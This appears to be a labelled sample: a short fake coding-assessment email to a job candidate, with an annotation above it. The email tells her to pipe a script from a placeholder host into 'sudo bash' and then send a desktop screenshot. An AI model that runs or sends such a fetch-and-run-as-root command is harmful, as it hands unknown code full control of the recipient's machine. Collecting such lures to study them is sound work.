note: Tells the candidate to pipe a downloaded script into a root shell to set up an assessment.
text:
Hi Priya,

Your coding assessment for Quartzline Systems is ready. To set up the environment, open your terminal and run:

curl -s http://quartzline-setup.example/install.sh | sudo bash

Then reply with a screenshot of your desktop.
